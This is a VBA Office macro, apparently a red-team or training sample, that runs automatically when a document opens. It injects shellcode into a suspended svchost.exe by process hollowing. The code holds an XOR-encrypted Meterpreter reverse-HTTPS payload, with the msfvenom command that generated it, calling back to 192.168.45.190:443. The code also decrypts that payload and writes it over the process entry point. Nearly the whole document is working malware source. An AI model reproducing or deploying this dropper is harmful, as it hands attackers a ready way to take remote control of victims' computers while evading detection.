#If Win64 Then
    Private Declare PtrSafe Function ZwQueryInformationProcess Lib "NTDLL" (ByVal hProcess As LongPtr, ByVal procInformationClass As Long, ByRef procInformation As PROCESS_BASIC_INFORMATION, ByVal ProcInfoLen As Long, ByRef retlen As Long) As Long
    Private Declare PtrSafe Function CreateProcessA Lib "KERNEL32" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, ByVal lpEnvironment As LongPtr, ByVal lpCurrentDirectory As String, lpStartupInfo As STARTUPINFOA, lpProcessInformation As PROCESS_INFORMATION) As LongPtr
    Private Declare PtrSafe Function ReadProcessMemory Lib "KERNEL32" (ByVal hProcess As LongPtr, ByVal lpBaseAddress As LongPtr, lpBuffer As Any, ByVal dwSize As Long, ByVal lpNumberOfBytesRead As Long) As Long
    Private Declare PtrSafe Function WriteProcessMemory Lib "KERNEL32" (ByVal hProcess As LongPtr, ByVal lpBaseAddress As LongPtr, lpBuffer As Any, ByVal nSize As Long, ByVal lpNumberOfBytesWritten As Long) As Long
    Private Declare PtrSafe Function ResumeThread Lib "KERNEL32" (ByVal hThread As LongPtr) As Long
    Private Declare PtrSafe Sub RtlZeroMemory Lib "KERNEL32" (Destination As STARTUPINFOA, ByVal Length As Long)
    Private Declare PtrSafe Function GetProcAddress Lib "KERNEL32" (ByVal hModule As LongPtr, ByVal lpProcName As String) As LongPtr
    Private Declare PtrSafe Function LoadLibraryA Lib "KERNEL32" (ByVal lpLibFileName As String) As LongPtr
    Private Declare PtrSafe Function VirtualProtect Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flNewProtect As Long, ByRef lpflOldProtect As Long) As Long
    Private Declare PtrSafe Function CryptBinaryToStringA Lib "CRYPT32" (ByRef pbBinary As Any, ByVal cbBinary As Long, ByVal dwFlags As Long, ByRef pszString As Any, pcchString As Any) As Long
#Else
    Private Declare Function ZwQueryInformationProcess Lib "NTDLL" (ByVal hProcess As LongPtr, ByVal procInformationClass As Long, ByRef procInformation As PROCESS_BASIC_INFORMATION, ByVal ProcInfoLen As Long, ByRef retlen As Long) As Long
    Private Declare Function CreateProcessA Lib "KERNEL32" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, ByVal lpEnvironment As LongPtr, ByVal lpCurrentDirectory As String, lpStartupInfo As STARTUPINFOA, lpProcessInformation As PROCESS_INFORMATION) As LongPtr
    Private Declare Function ReadProcessMemory Lib "KERNEL32" (ByVal hProcess As LongPtr, ByVal lpBaseAddress As LongPtr, lpBuffer As Any, ByVal dwSize As Long, ByVal lpNumberOfBytesRead As Long) As Long
    Private Declare Function WriteProcessMemory Lib "KERNEL32" (ByVal hProcess As LongPtr, ByVal lpBaseAddress As LongPtr, lpBuffer As Any, ByVal nSize As Long, ByVal lpNumberOfBytesWritten As Long) As Long
    Private Declare Function ResumeThread Lib "KERNEL32" (ByVal hThread As LongPtr) As Long
    Private Declare Sub RtlZeroMemory Lib "KERNEL32" (Destination As STARTUPINFOA, ByVal Length As Long)
    Private Declare Function GetProcAddress Lib "KERNEL32" (ByVal hModule As LongPtr, ByVal lpProcName As String) As LongPtr
    Private Declare Function LoadLibraryA Lib "KERNEL32" (ByVal lpLibFileName As String) As LongPtr
    Private Declare Function VirtualProtect Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flNewProtect As Long, ByRef lpflOldProtect As Long) As Long
    Private Declare Function CryptBinaryToStringA Lib "CRYPT32" (ByRef pbBinary As Any, ByVal cbBinary As Long, ByVal dwFlags As Long, ByRef pszString As Any, pcchString As Any) As Long
#End If

Private Type PROCESS_BASIC_INFORMATION
    Reserved1 As LongPtr
    PebAddress As LongPtr
    Reserved2 As LongPtr
    Reserved3 As LongPtr
    UniquePid As LongPtr
    MoreReserved As LongPtr
End Type

Private Type STARTUPINFOA
    cb As Long
    lpReserved As String
    lpDesktop As String
    lpTitle As String
    dwX As Long
    dwY As Long
    dwXSize As Long
    dwYSize As Long
    dwXCountChars As Long
    dwYCountChars As Long
    dwFillAttribute As Long
    dwFlags As Long
    wShowWindow As Integer
    cbReserved2 As Integer
    lpReserved2 As String
    hStdInput As LongPtr
    hStdOutput As LongPtr
    hStdError As LongPtr
End Type

Private Type PROCESS_INFORMATION
    hProcess As LongPtr
    hThread As LongPtr
    dwProcessId As Long
    dwThreadId As Long
End Type

Sub Document_Open()
    hollow
End Sub

Sub AutoOpen()
    hollow
End Sub

' Performs process hollowing to run shellcode in svchost.exe
Function hollow()
    Dim si As STARTUPINFOA
    RtlZeroMemory si, Len(si)
    si.cb = Len(si)
    si.dwFlags = &H100
    Dim pi As PROCESS_INFORMATION
    Dim procOutput As LongPtr
    ' Start svchost.exe in a suspended state
    procOutput = CreateProcessA(vbNullString, "C:\\Windows\\System32\\svchost.exe", ByVal 0&, ByVal 0&, False, &H4, 0, vbNullString, si, pi)
    
    Dim ProcBasicInfo As PROCESS_BASIC_INFORMATION
    Dim ProcInfo As LongPtr
    ProcInfo = pi.hProcess
    Dim PEBinfo As LongPtr

#If Win64 Then
    zwOutput = ZwQueryInformationProcess(ProcInfo, 0, ProcBasicInfo, 48, 0)
    PEBinfo = ProcBasicInfo.PebAddress + 16
    Dim AddrBuf(7) As Byte
#Else
    zwOutput = ZwQueryInformationProcess(ProcInfo, 0, ProcBasicInfo, 24, 0)
    PEBinfo = ProcBasicInfo.PebAddress + 8
    Dim AddrBuf(3) As Byte
#End if

    Dim tmp As Long
    tmp = 0
#If Win64 Then
    ' Read 8 bytes of PEB to obtain base address of svchost in AddrBuf
    readOutput = ReadProcessMemory(ProcInfo, PEBinfo, AddrBuf(0), 8, tmp)
    svcHostBase = AddrBuf(7) * (2 ^ 56)
    svcHostBase = svcHostBase + AddrBuf(6) * (2 ^ 48)
    svcHostBase = svcHostBase + AddrBuf(5) * (2 ^ 40)
    svcHostBase = svcHostBase + AddrBuf(4) * (2 ^ 32)
    svcHostBase = svcHostBase + AddrBuf(3) * (2 ^ 24)
    svcHostBase = svcHostBase + AddrBuf(2) * (2 ^ 16)
    svcHostBase = svcHostBase + AddrBuf(1) * (2 ^ 8)
    svcHostBase = svcHostBase + AddrBuf(0)
#Else
    ' Read 4 bytes of PEB to obtain base address of svchost in AddrBuf
    readOutput = ReadProcessMemory(ProcInfo, PEBinfo, AddrBuf(0), 4, tmp)
    svcHostBase = AddrBuf(3) * (2 ^ 24)
    svcHostBase = svcHostBase + AddrBuf(2) * (2 ^ 16)
    svcHostBase = svcHostBase + AddrBuf(1) * (2 ^ 8)
    svcHostBase = svcHostBase + AddrBuf(0)
#End if

    Dim data(512) As Byte
    ' Read more data from PEB so e_lfanew offset can be retrieved
    readOutput2 = ReadProcessMemory(ProcInfo, svcHostBase, data(0), 512, tmp)
    
    ' Read e_lfanew offset value and add 40
    Dim e_lfanew_offset As Long
    e_lfanew_offset = data(60)

    Dim opthdr As Long
    opthdr = e_lfanew_offset + 40
    
    ' Construct relative virtual address for svchost's entry point
    Dim entrypoint_rva As Long
    entrypoint_rva = data(opthdr + 3) * (2 ^ 24)
    entrypoint_rva = entrypoint_rva + data(opthdr + 2) * (2 ^ 16)
    entrypoint_rva = entrypoint_rva + data(opthdr + 1) * (2 ^ 8)
    entrypoint_rva = entrypoint_rva + data(opthdr)

    Dim addressOfEntryPoint As LongPtr
    ' Add base address of svchost with the entry point RVA to get the start of the buffer to overwrite with shellcode
    addressOfEntryPoint = entrypoint_rva + svcHostBase
    
    ' Buffer for malicious crypted shellcode needs to go here
    Dim sc As Variant
    Dim key As String
    ' TODO change the key
    key = "B0k4nRbRul3s"

' msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.45.190 LPORT=443 EXITFUNC=thread -f vbapplication --encrypt xor --encrypt-key 'B0k4nRbRul3s'
sc = Array(190,120,232,208,158,186,174,82,117,108,114,34,3,96,57,124,95,128,7,26,254,62,83,34,10,187,57,44,56,26,233,0,85,36,60,196,8,122,38,5,167,26,233,32,37,36,2,179,238,12,10,72,108,126,66,19,180,165,62,50,67,241,137,217,60,19,51,26,254,62,19,248,0,12,35,53,190,52,227,42,109, _
103,49,124,199,66,107,52,110,217,226,218,117,108,51,59,199,240,31,83,38,83,178,22,254,44,19,58,67,224,59,191,38,74,129,4,56,93,250,59,189,249,42,191,90,218,42,83,163,36,2,179,3,241,162,57,194,19,99,147,77,140,70,130,14,51,39,16,102,23,91,131,0,180,107,55,201,112,79,125,111, _
130,4,19,254,96,123,55,201,112,119,125,111,130,35,217,113,228,123,114,146,113,51,117,54,12,59,8,52,52,114,42,3,106,35,183,130,114,35,0,138,140,107,50,27,106,35,191,124,187,41,173,138,147,110,59,115,235,56,125,208,37,11,60,28,2,86,7,66,113,61,124,231,179,43,149,183,32,68,85,69, _
207,190,103,61,186,21,82,117,108,126,28,56,89,7,88,15,125,87,124,69,76,27,62,35,83,2,90,26,61,17,58,78,76,122,29,54,85,7,20,35,51,1,114,58,63,19,43,98,1,95,107,89,13,80,123,85,45,67,3,46,85,60,81,12,25,11,38,90,90,3,70,108,1,69,5,91,114,74,25,61, _
56,126,63,110,16,7,93,5,55,66,21,16,15,88,28,107,16,61,81,28,33,11,61,27,67,2,68,108,4,69,5,78,1,3,52,20,30,90,92,116,0,94,26,95,124,83,103,117,53,96,41,15,1,171,121,95,155,49,1,60,214,9,37,59,151,107,52,110,82,157,135,157,99,51,115,66,1,82,6,64, _
99,84,106,91,88,6,93,115,9,91,52,52,26,235,147,60,171,243,200,67,48,107,121,95,155,49,1,31,111,96,58,248,103,226,171,168,82,98,82,117,147,230,155,117,48,107,52,65,36,16,52,70,88,103,10,113,0,2,125,43,102,21,10,29,14,94,0,15,94,42,117,36,55,81,35,77,1,69,58,18, _
99,88,0,43,54,11,106,18,37,87,41,5,99,32,85,88,17,7,26,50,6,51,59,203,241,56,110,47,10,47,99,188,63,123,203,66,2,195,176,110,82,98,82,37,63,96,58,133,242,128,97,64,105,157,135,61,229,245,25,72,111,35,189,159,56,125,8,39,4,179,64,66,48,34,189,142,56,102,19,44, _
37,137,6,4,174,237,52,110,82,98,173,160,33,2,179,17,106,35,189,159,31,83,155,56,93,250,32,17,121,172,246,67,84,122,41,138,185,182,179,55,47,35,243,175,218,113,82,117,37,137,55,178,5,139,52,110,82,98,173,160,36,204,188,54,50,128,158,134,7,98,82,117,63,106,25,2,106,34,189,191, _
147,128,66,60,171,243,115,82,48,107,125,212,10,198,1,144,108,51,115,66,207,190,124,253,1,49,26,252,139,123,250,179,120,226,238,39,149,162,82,85,108,51,58,203,201,34,142,124,196,235,176,117,108,51,115,189,229,35,183,170,114,231,146,1,222,85,248,69,120,106,247,235,146,23,128,45,175,107,25,66, _
105,208,212,115,120,104,19,252,182,204,166)

    Dim scSize As Long
    scSize = UBound(sc)
    ' Decrypt shellcode
    Dim keyArrayTemp() As Byte
    keyArrayTemp = key
    
    i = 0
    For x = 0 To UBound(sc)
        sc(x) = sc(x) Xor keyArrayTemp(i)
        i = (i + 2) Mod (Len(key) * 2)
    Next x
    
    ' TODO set the SIZE here (use a size > to the shellcode size)
    Dim buf(685) As Byte
    For y = 0 To UBound(sc)
        buf(y) = sc(y)
    Next y
    
    ' Write the shellcode into the svchost.exe entry point
    a = WriteProcessMemory(ProcInfo, addressOfEntryPoint, buf(0), scSize, tmp)
    ' Resume svchost.exe process to run the shellcode
    b = ResumeThread(pi.hThread)
 
End Function